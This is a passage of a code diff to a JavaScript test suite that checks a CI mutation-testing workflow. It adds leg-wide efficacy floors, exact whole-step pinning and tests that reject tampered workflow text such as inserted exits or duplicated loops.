@@ -59,6 +59,19 @@ const advisoryGroupPackages = new Map([
     ],
   ],
 ]);
+// PW-6.8: the leg-wide efficacy floor for each advisory group's 6 extra
+// mutators, measured in run 33901506579 (2026-09-04) and set to
+// floor(measured) - 2pp of slack. See the matrix.include `floor:` field and
+// the ADVISORY_GROUP_FLOORS env block above for the per-leg comments; this
+// map is the single source both are checked against.
+const advisoryGroupFloors = new Map([
+  ["server", 93],
+  ["edge", 80],
+  ["generic", 81],
+  ["misc-a", 92],
+  ["misc-b", 92],
+  ["misc-c", 90],
+]);
 const timeoutCoefficients = new Set(["pool", "protocol"]);
 // adapter-drydock needs the coefficient in its advisory row (run 33848880338:
 // 30 of 32 extra mutants TIMED OUT under the default coefficient) without
@@ -230,6 +243,7 @@ function assertMutationWorkflow(source, expectedPackages = productionPackagePath
   assertCanaryJob(source);
   assertAdvisoryJob(source, entries);
   assertAdvisorySummaryJob(source);
+  assertMutationSurvivorsRecordStep(source, entries);
   assertRatchetJob(source);
 }
 
@@ -286,6 +300,43 @@ function runStepBodies(jobText) {
   }
   if (collecting) bodies.push(bodyLines.join("\n"));
   return bodies.join("\n---\n");
+}
+
+// Locates a step by its exact `- name: ` line within a job's text and
+// returns the step's ENTIRE block -- the `- name:` line itself through
+// every key that follows it (env:, run:, if:, continue-on-error:, shell:,
+// working-directory:, whatever it has) -- as an array of literal lines,
+// indentation included. Pinning only the run: scalar left every OTHER key
+// on the step unchecked: `if: false`, `continue-on-error: true`, or a
+// `shell:` override that changes how the same script text even runs all
+// pass with an identical body. The step name must occur exactly once in
+// the job text first: `indexOf` finding the first match silently accepts a
+// same-named decoy step placed earlier with `if: false` and the real body,
+// shadowing whichever step actually runs. A YAML clipped block scalar
+// (`|`, the default chomping) keeps exactly one trailing newline; the blank
+// line(s) between this step and whatever text follows in the source are
+// formatting, not part of any key's value, so trailing blank entries are
+// trimmed.
+function stepBlockLines(jobText, stepName, missingMessage) {
+  const nameLine = `      - name: ${stepName}`;
+  const nameLineRe = new RegExp(`^ {6}- name: ${escapeForRegExp(stepName)}$`, "gmu");
+  const matches = [...jobText.matchAll(nameLineRe)];
+  assert.notEqual(matches.length, 0, missingMessage);
+  assert.ok(
+    matches.length === 1,
+    `the step named ${JSON.stringify(stepName)} must appear exactly once in the job, found ${matches.length} (a same-named decoy step can shadow the real one)`,
+  );
+  const stepStart = matches[0].index;
+  assert.ok(jobText.slice(stepStart, stepStart + nameLine.length) === nameLine);
+  const nextStepMatch = /^ {6}- name: /mu.exec(jobText.slice(stepStart + nameLine.length));
+  const stepText =
+    nextStepMatch === null
+      ? jobText.slice(stepStart)
+      : jobText.slice(stepStart, stepStart + nameLine.length + nextStepMatch.index);
+  const lines = stepText.split("\n");
+  while (lines.length > 0 && lines[lines.length - 1] === "") lines.pop();
+  assert.ok(lines.length > 0, `${missingMessage} (empty step block)`);
+  return lines;
 }
 
 // PW-5.5's split applies here too: the ratchet job reads this run's own
@@ -505,6 +556,19 @@ function assertAdvisoryMatrix(advisory, entries) {
     const marker = "            packages: |\n";
     const packagesStart = block.indexOf(marker);
     assert.notEqual(packagesStart, -1, `advisory group ${groupName} must declare packages: |`);
+
+    // PW-6.8: the leg-wide floor for this group's 6 extra mutators, measured
+    // in run 33901506579. It lives in the preamble between the group name
+    // and its packages: | marker, alongside whatever comments explain it.
+    const preamble = block.slice(0, packagesStart);
+    const floorMatch = preamble.match(/^ {12}floor: (\d+)$/mu);
+    assert.ok(floorMatch, `${groupName} is missing its advisory floor`);
+    const expectedGroupFloor = advisoryGroupFloors.get(groupName);
+    assert.ok(expectedGroupFloor !== undefined, `unexpected advisory group ${groupName}`);
+    if (Number(floorMatch[1]) !== expectedGroupFloor) {
+      throw new Error(`${groupName} advisory floor is weakened`);
+    }
+
     const rest = block.slice(packagesStart + marker.length);
 
     const packageLines = [];
@@ -682,6 +746,38 @@ function assertAdvisorySummaryJob(source) {
     );
   }
 
+  // PW-6.8: ADVISORY_GROUP_FLOORS mirrors the matrix.include `floor:` field
+  // the same way ADVISORY_GROUP_PACKAGES mirrors its packages, and for the
+  // same reason: this job runs after the matrix and has no context left to
+  // read it from.
+  const floorsEnvMatch = summary.match(/^ {10}ADVISORY_GROUP_FLOORS: \|\n((?: {12}.+\n)+)/mu);
+  assert.ok(floorsEnvMatch, "the advisory summary job must declare ADVISORY_GROUP_FLOORS");
+  const declaredFloorPairs = floorsEnvMatch[1]
+    .split("\n")
+    .filter((line) => line.length > 0)
+    .map((line) => line.slice("            ".length));
+  const expectedFloorPairs = [...advisoryGroupFloors].map(([group, floor]) => `${group}|${floor}`);
+  if (JSON.stringify(declaredFloorPairs) !== JSON.stringify(expectedFloorPairs)) {
+    throw new Error(
+      "the advisory summary job's ADVISORY_GROUP_FLOORS must match the advisory matrix's own floors exactly",
+    );
+  }
+
+  // The sums this job compares against ADVISORY_GROUP_FLOORS come from rows
+  // the legs already wrote; this job must never re-measure, and a miss must
+  // warn rather than fail (the mutation-gate.sh pattern is for the gating
+  // job, not this one).
+  assert.doesNotMatch(
+    summary,
+    /mutation-gate\.sh/u,
+    "the advisory summary job must not call the gate, or it stops being advisory",
+  );
+  assert.match(
+    summary,
+    /::warning::advisory group \$\{group\} measured \$\{efficacy\}% efficacy on the 6 extra mutators, below its floor of \$\{floor\}%/u,
+    "the advisory summary job must warn when a leg's efficacy is below its measured floor",
+  );
+
   assert.match(
     summary,
     /^ {10}if \[ "\$\{#missing_groups\[@\]\}" -gt 0 \]; then$/mu,
@@ -691,6 +787,221 @@ function assertAdvisorySummaryJob(source) {
     summary,
     /^ {12}exit 1$/mu,
     "the advisory summary job must exit non-zero when a group is missing",
+  );
+
+  // The `mutation-gate.sh` check above catches a re-measure-and-gate rewrite,
+  // but pinning only the run: scalar leaves every OTHER key on the step
+  // unchecked: `if: false`, `continue-on-error: true`, or a `shell:`
+  // override all pass with an identical, correct-looking body, since none
+  // of them touch the text this test used to compare. Pin the step's
+  // ENTIRE block instead -- the `- name:` line through env:, run:, and
+  // anything else it carries -- so an added or changed key anywhere on the
+  // step fails the same way a rewritten script line does.
+  const expectedSummaryStepLines = [
+    "      - name: Combine and publish the advisory table",
+    "        env:",
+    "          # One line per package in the mutation-advisory matrix above,",
+    "          # group|package, so a leg that produced no artifact still gets an",
+    "          # explicit row instead of silently vanishing from the table.",
+    "          # scripts/mutation-config.test.mjs cross-checks this list against",
+    "          # that matrix's own groups and packages.",
+    "          ADVISORY_GROUP_PACKAGES: |",
+    "            server|./internal/server",
+    "            edge|./internal/edge",
+    "            generic|./internal/generic",
+    "            misc-a|./internal/adapter",
+    "            misc-a|./internal/adapter/drydock",
+    "            misc-a|./internal/auth",
+    "            misc-a|./internal/audit",
+    "            misc-b|./internal/docker",
+    "            misc-b|./internal/mcp",
+    "            misc-b|./internal/metrics",
+    "            misc-c|./cmd/portwing",
+    "            misc-c|./internal/banner",
+    "            misc-c|./internal/config",
+    "            misc-c|./internal/log",
+    "            misc-c|./internal/pool",
+    "            misc-c|./internal/protocol",
+    "          # PW-6.8: one line per advisory leg, group|floor, mirroring the",
+    "          # matrix.include `floor:` field above. Duplicated for the same",
+    "          # reason ADVISORY_GROUP_PACKAGES is: this job runs after the",
+    "          # matrix and has no context left to read it from.",
+    "          # scripts/mutation-config.test.mjs cross-checks this against the",
+    "          # advisory matrix's own floors.",
+    "          ADVISORY_GROUP_FLOORS: |",
+    "            server|93",
+    "            edge|80",
+    "            generic|81",
+    "            misc-a|92",
+    "            misc-b|92",
+    "            misc-c|90",
+    "        run: |",
+    "          set -euo pipefail",
+    "",
+    "          # A leg killed before it could upload (the runner's CPU shutdown",
+    "          # signal, PW-6.8's own comment above) leaves no rows file for its",
+    "          # group, and `cat ... || true` below would read that silently: the",
+    "          # summary renders as complete with one group just missing. Every",
+    "          # expected group is checked here, and each package in a missing",
+    "          # group gets an explicit row instead of vanishing.",
+    "          declare -A group_present=()",
+    "          missing_groups=()",
+    "          missing_headline_rows=()",
+    "          missing_mutator_rows=()",
+    "",
+    "          while IFS='|' read -r group package; do",
+    '            [ -n "${group}" ] || continue',
+    '            if [ -z "${group_present[${group}]:-}" ]; then',
+    '              if compgen -G "rows/mutation-advisory-${group}-*/mutation-advisory-headline.txt" >/dev/null; then',
+    '                group_present[${group}]="yes"',
+    "              else",
+    '                group_present[${group}]="no"',
+    '                missing_groups+=("${group}")',
+    "              fi",
+    "            fi",
+    '            if [ "${group_present[${group}]}" = "no" ]; then',
+    '              missing_headline_rows+=("| \\`${package}\\` | missing (leg produced no artifact) | | | | |")',
+    '              missing_mutator_rows+=("| \\`${package}\\` | missing | missing | missing | missing | missing | missing |")',
+    "            fi",
+    '          done <<<"${ADVISORY_GROUP_PACKAGES}"',
+    "",
+    "          # PW-6.8: each present leg's headline rows already carry killed and",
+    "          # lived per package (this job never re-runs Gremlins); this sums",
+    "          # them per group and compares the sum's efficacy on the 6 extra",
+    "          # mutators against the floor measured in run 33901506579. A miss is",
+    "          # a ::warning::, never a failing exit: this job stays advisory the",
+    "          # same way the legs above do, and the missing-group check below is",
+    "          # the only thing in this job allowed to fail it.",
+    "          while IFS='|' read -r group floor; do",
+    '            [ -n "${group}" ] || continue',
+    '            [ "${group_present[${group}]:-no}" = "yes" ] || continue',
+    "            killed_sum=0",
+    "            lived_sum=0",
+    "            while IFS='|' read -r _ _ killed lived _ _; do",
+    '              killed="${killed// /}"',
+    '              lived="${lived// /}"',
+    "              case \"${killed}\" in ''|*[!0-9]*) continue ;; esac",
+    "              case \"${lived}\" in ''|*[!0-9]*) continue ;; esac",
+    "              killed_sum=$((killed_sum + killed))",
+    "              lived_sum=$((lived_sum + lived))",
+    "            done < <(sed 's/^|//;s/|$//' rows/mutation-advisory-\"${group}\"-*/mutation-advisory-headline.txt)",
+    "            total=$((killed_sum + lived_sum))",
+    '            if [ "${total}" -gt 0 ]; then',
+    '              efficacy="$(awk -v k="${killed_sum}" -v t="${total}" \'BEGIN { printf "%.2f", (k / t) * 100 }\')"',
+    '              if awk -v e="${efficacy}" -v f="${floor}" \'BEGIN { exit !(e < f) }\'; then',
+    '                echo "::warning::advisory group ${group} measured ${efficacy}% efficacy on the 6 extra mutators, below its floor of ${floor}%"',
+    "              fi",
+    "            fi",
+    '          done <<<"${ADVISORY_GROUP_FLOORS}"',
+    "",
+    "          {",
+    '            echo "### Mutation advisory: Gremlins\' default-disabled mutators"',
+    '            echo ""',
+    '            echo "Advisory. These numbers gate nothing. Each leg runs ONLY the 6"',
+    '            echo "mutator types Gremlins disables by default; the gating matrix above"',
+    '            echo "already measures the 5 it enables, so efficacy here is efficacy"',
+    '            echo "against those 6 extra mutators alone, not against the gating floor."',
+    '            echo ""',
+    '            echo "| Package | Extra mutants | Killed | Lived | Not covered | Efficacy on extra mutators |"',
+    '            echo "|---|---|---|---|---|---|"',
+    "            cat rows/*/mutation-advisory-headline.txt 2>/dev/null || true",
+    '            if [ "${#missing_headline_rows[@]}" -gt 0 ]; then',
+    "              printf '%s\\n' \"${missing_headline_rows[@]}\"",
+    "            fi",
+    '            echo ""',
+    '            echo "Mutants discovered per advisory mutator type:"',
+    '            echo ""',
+    '            echo "| Package | invert-logical | invert-bitwise | invert-bwassign | invert-assignments | invert-loopctrl | remove-self-assignments |"',
+    '            echo "|---|---|---|---|---|---|---|"',
+    "            cat rows/*/mutation-advisory-mutators.txt 2>/dev/null || true",
+    '            if [ "${#missing_mutator_rows[@]}" -gt 0 ]; then',
+    "              printf '%s\\n' \"${missing_mutator_rows[@]}\"",
+    "            fi",
+    '          } >>"$GITHUB_STEP_SUMMARY"',
+    "",
+    "          # A missing group is the same green-means-nothing failure PW-6.1",
+    "          # was about: this job runs nothing but the download and the render,",
+    "          # so failing it here is safe and is the only place left that can",
+    "          # notice a leg never uploaded.",
+    '          if [ "${#missing_groups[@]}" -gt 0 ]; then',
+    '            echo "::error::advisory legs produced no artifact for group(s): ${missing_groups[*]}" >&2',
+    "            exit 1",
+    "          fi",
+  ];
+  const summaryStepLines = stepBlockLines(
+    summary,
+    "Combine and publish the advisory table",
+    "the advisory summary job must have a 'Combine and publish the advisory table' step",
+  );
+
+  // A step count is cheap, exact, and independent of stepBlockLines' own
+  // by-name pin above: an appended step counts as a `      - ` list item
+  // under `steps:` whether or not it carries a `- name:` key at all, so an
+  // anonymous `- run:` item spliced in after the pinned step (where the
+  // by-name pin's own "no next step" fallback would otherwise fold it
+  // straight into the pinned step's own line count) trips this with its
+  // own message first. The decoy-shadow check above still fires first for
+  // a same-named decoy, since that throws inside stepBlockLines itself
+  // before this line is ever reached.
+  const stepCount = (summary.match(/^ {6}- /gmu) ?? []).length;
+  assert.ok(
+    stepCount === 3,
+    `the advisory summary job must have exactly 3 steps, found ${stepCount}`,
+  );
+
+  assert.ok(
+    summaryStepLines.length === expectedSummaryStepLines.length,
+    `the advisory summary job's "Combine and publish the advisory table" step must have exactly ${expectedSummaryStepLines.length} lines, found ${summaryStepLines.length}`,
+  );
+  for (const [i, actualLine] of summaryStepLines.entries()) {
+    assert.ok(
+      actualLine === expectedSummaryStepLines[i],
+      `the advisory summary job's "Combine and publish the advisory table" step must match the pinned script exactly, or the wrapping, duplication, or splicing that a region check misses goes unnoticed; line ${i + 1} must be ${JSON.stringify(expectedSummaryStepLines[i])}, found ${JSON.stringify(actualLine)}`,
+    );
+  }
+
+  // Defense in depth alongside the whole-step pin above: even if a rewrite
+  // somehow left this step's own line count and text alone, a second copy
+  // of the floor-compare loop spliced in anywhere else in the workflow
+  // would still get a vote no test here is watching for. The header is
+  // distinctive enough (no other loop in this file reads a bare
+  // "group|floor" pair) that "exactly once in the whole file" is a cheap,
+  // independent guard against that.
+  const floorLoopHeaderMatches =
+    source.match(/^ {10}while IFS='\|' read -r group floor; do$/gmu) ?? [];
+  assert.ok(
+    floorLoopHeaderMatches.length === 1,
+    `the floor-compare loop header must appear exactly once in the workflow, found ${floorLoopHeaderMatches.length}`,
+  );
+}
+
+// PW-2.5. The mutation-survivors record script (scripts/ci/mutation-survivors-record.sh)
+// needs the same name|package set the gating matrix declares, duplicated
+// here for the same reason ADVISORY_GROUP_PACKAGES is duplicated in the
+// advisory summary job above: the history job runs after the matrix and has
+// no access to its context. A package added to the matrix without a
+// matching MUTATION_PACKAGES line would silently record "missing" forever
+// instead of failing this check.
+function assertMutationSurvivorsRecordStep(source, entries) {
+  const history = jobBlock(source, "history", "the history job is missing");
+
+  const envMatch = history.match(/^ {10}MUTATION_PACKAGES: \|\n((?: {12}.+\n)+)/mu);
+  assert.ok(envMatch, "the history job must declare MUTATION_PACKAGES");
+  const declaredPairs = envMatch[1]
+    .split("\n")
+    .filter((line) => line.length > 0)
+    .map((line) => line.slice("            ".length));
+  const expectedPairs = entries.map((entry) => `${entry.name}|${entry.package}`);
+  if (JSON.stringify(declaredPairs) !== JSON.stringify(expectedPairs)) {
+    throw new Error(
+      "the history job's MUTATION_PACKAGES must match the gating matrix's own name|package set exactly",
+    );
+  }
+
+  assert.match(
+    history,
+    /scripts\/ci\/mutation-survivors-record\.sh records advisory \. mutation-packages\.txt/u,
+    "the history job must run the survivor identity record script over both artifact downloads",
   );
 }
 
@@ -710,12 +1021,32 @@ function escapeForRegExp(value) {
   return value.replaceAll(/[.*+?^${}()|[\]\\]/gu, "\\$&");
 }
 
+// Ends only at the next top-level job key, never at a bare 2-space comment:
+// a "  # note" line planted INSIDE this job's own step list used to match
+// the comment branch of the old regex and truncate the slice right there,
+// so a step appended after that comment ran in CI but was invisible to
+// every assertion below, including the exact-once step-name check. Every
+// job in this file is followed by that next job's own leading doc-comment
+// block (2-space `#` lines) before its key, so trimming still has to
+// happen -- just from the true END of the slice only, popping trailing
+// blank/comment lines one at a time, never scanning into the middle. An
+// injected comment with real step content after it is real content sitting
+// before that trailing run, so the loop below stops at it and the content
+// stays in the slice.
 function jobBlock(source, jobName, missingMessage) {
   const start = source.indexOf(`  ${jobName}:\n`);
   assert.notEqual(start, -1, missingMessage);
   const rest = source.slice(start + 1);
-  const next = rest.search(/^ {2}(?:[a-z][a-z0-9-]*:|#)/mu);
-  return next === -1 ? source.slice(start) : source.slice(start, start + 1 + next);
+  const next = rest.search(/^ {2}[a-z][a-z0-9-]*:/mu);
+  const end = next === -1 ? source.length : start + 1 + next;
+  const lines = source.slice(start, end).split("\n");
+  while (
+    lines.length > 0 &&
+    (lines[lines.length - 1] === "" || /^ {2}#/u.test(lines[lines.length - 1]))
+  ) {
+    lines.pop();
+  }
+  return `${lines.join("\n")}\n`;
 }
 
 // PW-6.1: a gate nobody proves can fail is the defect being fixed. The canary
@@ -1059,6 +1390,275 @@ test("mutation contract rejects an advisory floor that drifts from the matrix", 
   );
 });
 
+// PW-6.8: the leg-wide floor on the 6 extra mutators, distinct from the
+// per-package gating floor checked above. Missing and weakened get their own
+// tests because the two failures read differently to whoever is debugging a
+// broken contract.
+test("mutation contract rejects an advisory group missing its leg-wide floor", () => {
+  assertMutationFailure(
+    workflow.replace(
+      "          - group: server\n            # PW-6.8: measured 95.77% efficacy on the 6 extra mutators in run\n            # 33901506579 (2026-09-04): killed 68, lived 3 across\n            # ./internal/server. Floor is floor(measured) - 2pp of slack.\n            floor: 93\n",
+      "          - group: server\n",
+    ),
+    "server is missing its advisory floor",
+  );
+});
+
+test("mutation contract rejects a weakened leg-wide advisory floor", () => {
+  assertMutationFailure(
+    workflow.replace("            floor: 93\n", "            floor: 0\n"),
+    "server advisory floor is weakened",
+  );
+});
+
+test("mutation contract rejects an ADVISORY_GROUP_FLOORS that drifts from the matrix", () => {
+  assertMutationFailure(
+    workflow.replace("            server|93\n", "            server|94\n"),
+    "the advisory summary job's ADVISORY_GROUP_FLOORS must match the advisory matrix's own floors exactly",
+  );
+});
+
+test("mutation contract rejects a missing ADVISORY_GROUP_FLOORS declaration", () => {
+  assertMutationFailure(
+    workflow.replace(
+      "          ADVISORY_GROUP_FLOORS: |\n",
+      "          ADVISORY_GROUP_FLOORS_RENAMED: |\n",
+    ),
+    "the advisory summary job must declare ADVISORY_GROUP_FLOORS",
+  );
+});
+
+test("mutation contract rejects an advisory summary job that never warns on a floor miss", () => {
+  assertMutationFailure(
+    workflow.replace(
+      '                echo "::warning::advisory group ${group} measured ${efficacy}% efficacy on the 6 extra mutators, below its floor of ${floor}%"\n',
+      "",
+    ),
+    "the advisory summary job must warn when a leg's efficacy is below its measured floor",
+  );
+});
+
+test("mutation contract rejects an advisory summary job that gates on the leg-wide floor", () => {
+  assertMutationFailure(
+    workflow.replace(
+      '          done <<<"${ADVISORY_GROUP_FLOORS}"\n',
+      '          done <<<"${ADVISORY_GROUP_FLOORS}"\n\n          ./scripts/ci/mutation-gate.sh mutation-advisory-auth.json 79.17 97.96\n',
+    ),
+    "the advisory summary job must not call the gate, or it stops being advisory",
+  );
+});
+
+test("mutation contract rejects a hard exit inserted after the advisory floor warning", () => {
+  assertMutationFailure(
+    workflow.replace(
+      '                echo "::warning::advisory group ${group} measured ${efficacy}% efficacy on the 6 extra mutators, below its floor of ${floor}%"\n',
+      '                echo "::warning::advisory group ${group} measured ${efficacy}% efficacy on the 6 extra mutators, below its floor of ${floor}%"\n                exit 1\n',
+    ),
+    'the advisory summary job\'s "Combine and publish the advisory table" step must have exactly 129 lines, found 130',
+  );
+});
+
+test("mutation contract rejects a stray command inserted after the advisory floor warning", () => {
+  // A deny-list of exit/return 1/false wouldn't catch this: `[ 1 -eq 0 ]` is
+  // none of those, but it's still a statement that shouldn't be there.
+  assertMutationFailure(
+    workflow.replace(
+      '                echo "::warning::advisory group ${group} measured ${efficacy}% efficacy on the 6 extra mutators, below its floor of ${floor}%"\n',
+      '                echo "::warning::advisory group ${group} measured ${efficacy}% efficacy on the 6 extra mutators, below its floor of ${floor}%"\n                [ 1 -eq 0 ]\n',
+    ),
+    'the advisory summary job\'s "Combine and publish the advisory table" step must have exactly 129 lines, found 130',
+  );
+});
+
+test("mutation contract rejects a rewrite appended to the same line as the advisory floor warning", () => {
+  // Checking only the lines AFTER the warning line would miss this: `exit 1`
+  // tacked onto the end of the warning's own echo statement, sharing its
+  // line, so line count doesn't change and there is no separate "line
+  // after the warning" for a tail-only check to reject -- only an exact
+  // per-line comparison catches the warning's own line changing shape.
+  assertMutationFailure(
+    workflow.replace(
+      '                echo "::warning::advisory group ${group} measured ${efficacy}% efficacy on the 6 extra mutators, below its floor of ${floor}%"\n',
+      '                echo "::warning::advisory group ${group} measured ${efficacy}% efficacy on the 6 extra mutators, below its floor of ${floor}%"; exit 1\n',
+    ),
+    'the advisory summary job\'s "Combine and publish the advisory table" step must match the pinned script exactly, or the wrapping, duplication, or splicing that a region check misses goes unnoticed; line 92 must be "                echo \\"::warning::advisory group ${group} measured ${efficacy}% efficacy on the 6 extra mutators, below its floor of ${floor}%\\"", found "                echo \\"::warning::advisory group ${group} measured ${efficacy}% efficacy on the 6 extra mutators, below its floor of ${floor}%\\"; exit 1"',
+  );
+});
+
+test("mutation contract rejects a hard exit inserted before the advisory floor warning", () => {
+  // Neither a deny-list nor a tail-only allow-list ever inspects anything
+  // BEFORE the warning line: a bare exit 1 immediately above the echo
+  // statement makes a floor miss a hard failure and passed both older
+  // checks. Only pinning the whole loop body catches it.
+  assertMutationFailure(
+    workflow.replace(
+      '                echo "::warning::advisory group ${group} measured ${efficacy}% efficacy on the 6 extra mutators, below its floor of ${floor}%"\n',
+      '                exit 1\n                echo "::warning::advisory group ${group} measured ${efficacy}% efficacy on the 6 extra mutators, below its floor of ${floor}%"\n',
+    ),
+    'the advisory summary job\'s "Combine and publish the advisory table" step must have exactly 129 lines, found 130',
+  );
+});
+
+test("mutation contract rejects a line-continuation rewrite of the advisory floor warning", () => {
+  // A trailing `\` merges the warning's echo with the next physical line at
+  // the shell level, but the test reads physical lines: the warning line
+  // itself now ends in a literal backslash instead of the closing quote,
+  // and an extra physical line appears carrying the injected statement.
+  assertMutationFailure(
+    workflow.replace(
+      '                echo "::warning::advisory group ${group} measured ${efficacy}% efficacy on the 6 extra mutators, below its floor of ${floor}%"\n',
+      '                echo "::warning::advisory group ${group} measured ${efficacy}% efficacy on the 6 extra mutators, below its floor of ${floor}%" \\\n                ; exit 1\n',
+    ),
+    'the advisory summary job\'s "Combine and publish the advisory table" step must have exactly 129 lines, found 130',
+  );
+});
+
+test("mutation contract rejects the floor-compare loop wrapped in a dead conditional", () => {
+  // A region check anchored to the loop's own start/end pattern still
+  // matches when the whole loop is wrapped in `if false; then ... fi`: the
+  // anchor text is untouched, only its reachability changed. Pinning the
+  // step's entire run: script catches the two inserted lines even though
+  // neither one touches the loop's own text.
+  assertMutationFailure(
+    workflow.replace(
+      '          while IFS=\'|\' read -r group floor; do\n            [ -n "${group}" ] || continue\n            [ "${group_present[${group}]:-no}" = "yes" ] || continue\n            killed_sum=0\n            lived_sum=0\n            while IFS=\'|\' read -r _ _ killed lived _ _; do\n              killed="${killed// /}"\n              lived="${lived// /}"\n              case "${killed}" in \'\'|*[!0-9]*) continue ;; esac\n              case "${lived}" in \'\'|*[!0-9]*) continue ;; esac\n              killed_sum=$((killed_sum + killed))\n              lived_sum=$((lived_sum + lived))\n            done < <(sed \'s/^|//;s/|$//\' rows/mutation-advisory-"${group}"-*/mutation-advisory-headline.txt)\n            total=$((killed_sum + lived_sum))\n            if [ "${total}" -gt 0 ]; then\n              efficacy="$(awk -v k="${killed_sum}" -v t="${total}" \'BEGIN { printf "%.2f", (k / t) * 100 }\')"\n              if awk -v e="${efficacy}" -v f="${floor}" \'BEGIN { exit !(e < f) }\'; then\n                echo "::warning::advisory group ${group} measured ${efficacy}% efficacy on the 6 extra mutators, below its floor of ${floor}%"\n              fi\n            fi\n          done <<<"${ADVISORY_GROUP_FLOORS}"',
+      '          if false; then\n          while IFS=\'|\' read -r group floor; do\n            [ -n "${group}" ] || continue\n            [ "${group_present[${group}]:-no}" = "yes" ] || continue\n            killed_sum=0\n            lived_sum=0\n            while IFS=\'|\' read -r _ _ killed lived _ _; do\n              killed="${killed// /}"\n              lived="${lived// /}"\n              case "${killed}" in \'\'|*[!0-9]*) continue ;; esac\n              case "${lived}" in \'\'|*[!0-9]*) continue ;; esac\n              killed_sum=$((killed_sum + killed))\n              lived_sum=$((lived_sum + lived))\n            done < <(sed \'s/^|//;s/|$//\' rows/mutation-advisory-"${group}"-*/mutation-advisory-headline.txt)\n            total=$((killed_sum + lived_sum))\n            if [ "${total}" -gt 0 ]; then\n              efficacy="$(awk -v k="${killed_sum}" -v t="${total}" \'BEGIN { printf "%.2f", (k / t) * 100 }\')"\n              if awk -v e="${efficacy}" -v f="${floor}" \'BEGIN { exit !(e < f) }\'; then\n                echo "::warning::advisory group ${group} measured ${efficacy}% efficacy on the 6 extra mutators, below its floor of ${floor}%"\n              fi\n            fi\n          done <<<"${ADVISORY_GROUP_FLOORS}"\n          fi',
+    ),
+    'the advisory summary job\'s "Combine and publish the advisory table" step must have exactly 129 lines, found 131',
+  );
+});
+
+test("mutation contract rejects a duplicated floor-compare loop whose second copy is altered", () => {
+  // A region check built on `String.match()` returns the FIRST match: a
+  // live, correct copy of the loop followed by a second, altered copy
+  // (here, the warning replaced with a no-op `true`) still matches the
+  // first, correct copy and passes, leaving the second copy free to run
+  // whatever it wants. The whole-step pin has no "first match wins" blind
+  // spot because it compares every line the step actually contains.
+  assertMutationFailure(
+    workflow.replace(
+      '          while IFS=\'|\' read -r group floor; do\n            [ -n "${group}" ] || continue\n            [ "${group_present[${group}]:-no}" = "yes" ] || continue\n            killed_sum=0\n            lived_sum=0\n            while IFS=\'|\' read -r _ _ killed lived _ _; do\n              killed="${killed// /}"\n              lived="${lived// /}"\n              case "${killed}" in \'\'|*[!0-9]*) continue ;; esac\n              case "${lived}" in \'\'|*[!0-9]*) continue ;; esac\n              killed_sum=$((killed_sum + killed))\n              lived_sum=$((lived_sum + lived))\n            done < <(sed \'s/^|//;s/|$//\' rows/mutation-advisory-"${group}"-*/mutation-advisory-headline.txt)\n            total=$((killed_sum + lived_sum))\n            if [ "${total}" -gt 0 ]; then\n              efficacy="$(awk -v k="${killed_sum}" -v t="${total}" \'BEGIN { printf "%.2f", (k / t) * 100 }\')"\n              if awk -v e="${efficacy}" -v f="${floor}" \'BEGIN { exit !(e < f) }\'; then\n                echo "::warning::advisory group ${group} measured ${efficacy}% efficacy on the 6 extra mutators, below its floor of ${floor}%"\n              fi\n            fi\n          done <<<"${ADVISORY_GROUP_FLOORS}"',
+      '          while IFS=\'|\' read -r group floor; do\n            [ -n "${group}" ] || continue\n            [ "${group_present[${group}]:-no}" = "yes" ] || continue\n            killed_sum=0\n            lived_sum=0\n            while IFS=\'|\' read -r _ _ killed lived _ _; do\n              killed="${killed// /}"\n              lived="${lived// /}"\n              case "${killed}" in \'\'|*[!0-9]*) continue ;; esac\n              case "${lived}" in \'\'|*[!0-9]*) continue ;; esac\n              killed_sum=$((killed_sum + killed))\n              lived_sum=$((lived_sum + lived))\n            done < <(sed \'s/^|//;s/|$//\' rows/mutation-advisory-"${group}"-*/mutation-advisory-headline.txt)\n            total=$((killed_sum + lived_sum))\n            if [ "${total}" -gt 0 ]; then\n              efficacy="$(awk -v k="${killed_sum}" -v t="${total}" \'BEGIN { printf "%.2f", (k / t) * 100 }\')"\n              if awk -v e="${efficacy}" -v f="${floor}" \'BEGIN { exit !(e < f) }\'; then\n                echo "::warning::advisory group ${group} measured ${efficacy}% efficacy on the 6 extra mutators, below its floor of ${floor}%"\n              fi\n            fi\n          done <<<"${ADVISORY_GROUP_FLOORS}"\n          while IFS=\'|\' read -r group floor; do\n            [ -n "${group}" ] || continue\n            [ "${group_present[${group}]:-no}" = "yes" ] || continue\n            killed_sum=0\n            lived_sum=0\n            while IFS=\'|\' read -r _ _ killed lived _ _; do\n              killed="${killed// /}"\n              lived="${lived// /}"\n              case "${killed}" in \'\'|*[!0-9]*) continue ;; esac\n              case "${lived}" in \'\'|*[!0-9]*) continue ;; esac\n              killed_sum=$((killed_sum + killed))\n              lived_sum=$((lived_sum + lived))\n            done < <(sed \'s/^|//;s/|$//\' rows/mutation-advisory-"${group}"-*/mutation-advisory-headline.txt)\n            total=$((killed_sum + lived_sum))\n            if [ "${total}" -gt 0 ]; then\n              efficacy="$(awk -v k="${killed_sum}" -v t="${total}" \'BEGIN { printf "%.2f", (k / t) * 100 }\')"\n              if awk -v e="${efficacy}" -v f="${floor}" \'BEGIN { exit !(e < f) }\'; then\n                true\n              fi\n            fi\n          done <<<"${ADVISORY_GROUP_FLOORS}"',
+    ),
+    'the advisory summary job\'s "Combine and publish the advisory table" step must have exactly 129 lines, found 150',
+  );
+});
+
+test("mutation contract rejects a hard exit spliced in right after the floor-compare loop", () => {
+  // Still inside the same run: script, still outside any region a
+  // start/end-anchored check would have captured: an `exit 1` dropped
+  // immediately after the loop's own closing `done` line sits entirely
+  // outside the old check's match, but not outside the step it runs in.
+  assertMutationFailure(
+    workflow.replace(
